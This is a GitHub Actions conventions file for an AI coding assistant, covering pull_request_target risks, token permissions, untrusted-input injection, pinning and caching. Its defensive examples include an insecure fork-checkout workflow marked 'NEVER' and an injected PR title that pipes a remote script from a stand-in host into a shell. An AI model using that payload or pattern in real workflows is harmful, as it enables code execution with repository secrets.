---
description: 'GitHub Actions workflow conventions — pinning, permissions, concurrency, caching, and the pull_request_target footgun.'
applyTo: '.github/workflows/**/*.{yml,yaml}'
---

# GitHub Actions

## Language Support (EN/IT)
- These instructions support both English and Italian inputs.
- Reply in the same language used by the user.
- Keep YAML keys, action references, and shell commands in English regardless of chat language.

## Security first — these three are not style preferences

### 1. `pull_request_target` + checking out the PR head is remote code execution

```yaml
# NEVER
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled code
      - run: npm install && npm test                       # ...now running with secrets
```

`pull_request_target` runs in the **base** repository's context, with access to secrets and a
read-write token, and it triggers on PRs from forks. Checking out the head means executing a
stranger's code with your credentials. `npm install` alone is enough — lifecycle scripts run.

- Need to test PR code? Use `on: pull_request`. It has no secrets and a read-only token, which is
  the point.
- Need a secret *and* PR code? Split it: an untrusted job that builds and uploads an artifact, and a
  separate `workflow_run` job that consumes the artifact without ever executing it.

### 2. Set `permissions` explicitly, at the narrowest scope that works

```yaml
permissions:
  contents: read          # top-level default for every job

jobs:
  release:
    permissions:
      contents: write     # widened only where actually needed
```

Without a `permissions:` block the token inherits the repository default, which may be read-write on
everything. State it even when read-only — an explicit `contents: read` is a decision; an absent
block is an accident.

### 3. Never interpolate untrusted input into `run:`

```yaml
- run: echo "${{ github.event.pull_request.title }}"    # title can contain shell metacharacters
```

A PR titled `"; curl evil.sh | sh #` executes. Pass it through the environment instead, where it is
data rather than script:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

Anything a contributor controls is untrusted: title, body, branch name, commit message, label names.

## Correctness

- **Pin third-party actions by commit SHA**, not tag. `uses: foo/bar@v3` re-resolves; a compromised
  or moved tag changes what runs. GitHub-authored `actions/*` by major tag is the usual accepted
  exception — apply the same reasoning, not the same rule, to anything else.
- **Cancel superseded runs** — without this every push to a PR keeps its predecessor running:
  ```yaml
  concurrency:
    group: ${{ github.workflow }}-${{ github.ref }}
    cancel-in-progress: true
  ```
- **Cache on the lockfile hash**, not a static key:
  `key: ${{ runner.os }}-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}`
- **`--frozen-lockfile` in CI.** `pnpm install` may resolve differently than the lockfile records;
  CI must fail on drift rather than silently install something else.
- **Pin the runner** (`ubuntu-24.04`), not `ubuntu-latest`, when the build is sensitive to the image.
  `latest` moves under you and the failure looks like your change.

## Match the project

Read `package.json` before writing a workflow — do not assume the scripts exist.

- Package manager comes from the lockfile: `pnpm-lock.yaml` → pnpm. This baseline uses **pnpm**;
  `npm ci` in a pnpm repo produces a confusing, slow, wrong build.
- The typecheck command is not always `tsc --noEmit`. A root `tsconfig.json` with `"references"`
  (the Vite scaffold) needs **`tsc -b`** — plain `--noEmit` does not follow references and silently
  checks nothing. `hooks/scripts/build-gate.ps1` makes the same distinction; keep them consistent.
- Only reference a script that exists. `pnpm test` fails confusingly when `package.json` has no
  `test` script.

## Do not duplicate the hooks

`build-gate` already runs typecheck, lint and the convention checks locally on every turn. A workflow
that re-implements those checks in different words will drift from them, and the two will disagree.

Prefer running **the same entry point** in CI as locally. Where a check exists as a script, call the
script.

## Anti-patterns

- ❌ `if: github.ref == 'refs/heads/main'` on a job that also needs `pull_request` — the condition is
  false for PRs, so the job silently never runs and the branch protection rule waits forever.
- ❌ Secrets in `env:` at workflow level — every job and every step gets them, including third-party
  actions.
- ❌ `continue-on-error: true` on a quality gate. That is a gate that never fails, which is not a gate.
- ❌ A matrix over Node versions the project does not support. Read `engines` first.
